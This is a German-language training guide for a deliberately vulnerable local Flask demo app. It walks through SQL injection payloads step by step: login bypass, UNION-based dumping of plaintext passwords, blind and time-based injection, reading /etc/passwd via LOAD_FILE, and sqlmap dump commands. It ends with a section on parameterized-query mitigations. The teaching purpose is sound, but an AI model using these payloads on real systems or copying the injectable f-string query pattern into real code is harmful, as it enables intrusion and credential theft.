# SQL Injection Test-Dokumentation
## Hebeln Mit Kopf - Vulnerable Demo Application

⚠️ **WICHTIG**: Diese Anwendung ist absichtlich verwundbar für Bildungs- und Testzwecke. Verwenden Sie diese Techniken NIEMALS in Produktionsumgebungen oder ohne ausdrückliche Genehmigung!

---

## Setup

1. **Datenbank initialisieren:**
```bash
mysql -u root -p < schema.sql
```

2. **Flask-App starten:**
```bash
python app.py
```

3. **Anwendung öffnen:**
http://127.0.0.1:5001

---

## Test 1: Authentication Bypass (Login ohne Passwort)

### Verwundbarer Code
```python
# app.py:58
cur.execute(f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}' LIMIT 1")
```

### Angriffsziel
Login-Seite: `http://127.0.0.1:5001/login`

### SQL Injection Payloads

#### Variante 1: OR-based Bypass
**Username:** `admin' OR '1'='1'-- -`
**Password:** `beliebig`

**Resultierende SQL-Query:**
```sql
SELECT * FROM users WHERE username = 'admin' OR '1'='1'-- -' AND password = 'beliebig' LIMIT 1
```

**Erklärung:**
- `'1'='1'` ist immer wahr
- `-- -` kommentiert den Rest der Query aus (inkl. Passwort-Check)
- Login erfolgreich als erster User in der Datenbank

#### Variante 2: Comment-based Bypass
**Username:** `admin'-- -`
**Password:** `egal`

**Resultierende SQL-Query:**
```sql
SELECT * FROM users WHERE username = 'admin'-- -' AND password = 'egal' LIMIT 1
```

**Erklärung:**
- Der Passwort-Check wird komplett auskommentiert
- Login nur mit Username möglich

#### Variante 3: Specific User Bypass
**Username:** `trader_max' OR username='crypto_lisa'-- -`
**Password:** `egal`

**Resultierende SQL-Query:**
```sql
SELECT * FROM users WHERE username = 'trader_max' OR username='crypto_lisa'-- -' AND password = 'egal' LIMIT 1
```

**Erklärung:**
- Login als spezifischer User ohne Passwort zu kennen

---

## Test 2: UNION-based SQL Injection (Data Exfiltration)

### Verwundbarer Code
```python
# app.py:105
sql = f"SELECT id, username, bio FROM users WHERE username LIKE '%{query}%' OR bio LIKE '%{query}%'"
```

### Angriffsziel
Suche-Seite: `http://127.0.0.1:5001/search`

### Phase 1: Anzahl der Spalten ermitteln

**Query:** `test' ORDER BY 1-- -`
**URL:** `http://127.0.0.1:5001/search?q=test' ORDER BY 1-- -`
✅ Funktioniert → mindestens 1 Spalte

**Query:** `test' ORDER BY 2-- -`
✅ Funktioniert → mindestens 2 Spalten

**Query:** `test' ORDER BY 3-- -`
✅ Funktioniert → mindestens 3 Spalten

**Query:** `test' ORDER BY 4-- -`
❌ Fehler → genau 3 Spalten!

### Phase 2: UNION SELECT testen

**Query:** `test' UNION SELECT 1,2,3-- -`
**URL:** `http://127.0.0.1:5001/search?q=test' UNION SELECT 1,2,3-- -`

**Ergebnis:**
```
ID: 1
Username: 2
Bio: 3
```

**Erklärung:**
- Die Zahlen 1, 2, 3 werden angezeigt
- Wir wissen nun, welche Spalten für Datenextraktion verwendbar sind

### Phase 3: Datenbank-Informationen sammeln

#### Datenbank-Version
**Query:** `' UNION SELECT 1,@@version,database()-- -`

#### Alle Tabellen anzeigen
**Query:** `' UNION SELECT NULL,table_name,table_schema FROM information_schema.tables-- -`

**Erwartetes Ergebnis:**
```
Username: users
Bio: hackingdb
Username: columns
Bio: information_schema
...
```

#### Spalten der users-Tabelle anzeigen
**Query:** `' UNION SELECT NULL,column_name,data_type FROM information_schema.columns WHERE table_name='users'-- -`

**Erwartetes Ergebnis:**
```
Username: id
Bio: int
Username: username
Bio: varchar
Username: password
Bio: varchar
Username: bio
Bio: varchar
...
```

### Phase 4: Sensitive Daten extrahieren

#### Alle Usernames und Passwörter
**Query:** `' UNION SELECT id,username,password FROM users-- -`

**Erwartetes Ergebnis:**
```
ID: 1
Username: admin
Bio: SecureP@ssw0rd!

ID: 2
Username: trader_max
Bio: MyPassword123

ID: 3
Username: crypto_lisa
Bio: Bitcoin2024!
...
```

#### Alle Daten concatenated
**Query:** `' UNION SELECT NULL,CONCAT(username,':',password),bio FROM users-- -`

**Erwartetes Ergebnis:**
```
Username: admin:SecureP@ssw0rd!
Username: trader_max:MyPassword123
Username: crypto_lisa:Bitcoin2024!
...
```

#### Passwörter als Liste in einer Zeile
**Query:** `' UNION SELECT 1,GROUP_CONCAT(username,':',password SEPARATOR ' | '),3 FROM users-- -`

**Erwartetes Ergebnis:**
```
Username: admin:SecureP@ssw0rd! | trader_max:MyPassword123 | crypto_lisa:Bitcoin2024! | ...
```

---

## Test 3: Blind SQL Injection (Bonus)

### Boolean-based Blind SQLi

**True-Condition (zeigt Ergebnisse):**
`test' OR 1=1-- -`

**False-Condition (zeigt keine Ergebnisse):**
`test' OR 1=2-- -`

### Daten Zeichen-für-Zeichen extrahieren

**Erstes Zeichen des Admin-Passworts testen:**
```
test' OR (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='S'-- -
```

**Zweites Zeichen:**
```
test' OR (SELECT SUBSTRING(password,2,1) FROM users WHERE username='admin')='e'-- -
```

---

## Erweiterte Techniken

### Time-based Blind SQLi
```sql
test' OR IF(1=1,SLEEP(5),0)-- -
```

### File Reading (wenn FILE privileges vorhanden)
```sql
' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3-- -
```

### Writing to File (SEHR GEFÄHRLICH - nur in Test-Umgebung!)
```sql
' UNION SELECT 1,2,3 INTO OUTFILE '/tmp/output.txt'-- -
```

---

## Demo-Accounts

| Username | Password | Bio |
|----------|----------|-----|
| admin | SecureP@ssw0rd! | Administrator - Full access to platform |
| trader_max | MyPassword123 | Spezialisiert auf DAX-Analysen |
| crypto_lisa | Bitcoin2024! | Fokus auf Kryptowährungen |
| value_investor | WarrenB123 | Value Investing, Fundamentalanalyse |
| swing_trader | TradeIt99 | Swing Trading mit Momentum |

---

## Mitigations (WIE MAN ES RICHTIG MACHT)

### ❌ FALSCH (Aktueller Code):
```python
cur.execute(f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'")
```

### ✅ RICHTIG (Prepared Statements):
```python
cur.execute("SELECT * FROM users WHERE username = %s AND password = %s", (username, password))
```

### Weitere Best Practices:
1. **Prepared Statements / Parameterized Queries** - IMMER verwenden!
2. **Input Validation** - Whitelisting von erlaubten Zeichen
3. **Least Privilege** - Datenbank-User mit minimalen Rechten
4. **Error Handling** - Keine SQL-Fehler an User anzeigen
5. **WAF (Web Application Firewall)** - Zusätzliche Schutzschicht
6. **Password Hashing** - NIEMALS Passwörter im Klartext speichern (bcrypt, argon2)

---

## Tools für automatisierte Tests

### SQLMap
```bash
# Login-Test
sqlmap -u "http://127.0.0.1:5001/login" --data "username=admin&password=test" --dbs

# Search-Test
sqlmap -u "http://127.0.0.1:5001/search?q=test" --dbs --dump
```

### Burp Suite
1. Request abfangen
2. Send to Repeater
3. Payloads manuell testen
4. Send to Intruder für automatisierte Tests

---

## Cheat Sheet: SQL Injection Kommentare

| Datenbank | Kommentar-Syntax |
|-----------|------------------|
| MySQL | `-- -` oder `#` oder `/**/` |
| PostgreSQL | `--` oder `/**/` |
| MSSQL | `--` oder `/**/` |
| Oracle | `--` |

**Wichtig:** Bei MySQL muss nach `--` ein Leerzeichen folgen! Deshalb `-- -` verwenden.

---

## Lernressourcen

- **PortSwigger Web Security Academy:** https://portswigger.net/web-security/sql-injection
- **OWASP SQL Injection:** https://owasp.org/www-community/attacks/SQL_Injection
- **HackTheBox / TryHackMe:** Praktische Labs
- **PentesterLab:** SQL Injection Übungen

---

**⚠️ ETHISCHER HINWEIS:**
Diese Techniken dürfen NUR in autorisierten Test-Umgebungen verwendet werden. Unbefugtes Testen auf fremden Systemen ist illegal und wird strafrechtlich verfolgt. Verwenden Sie Ihr Wissen verantwortungsvoll!
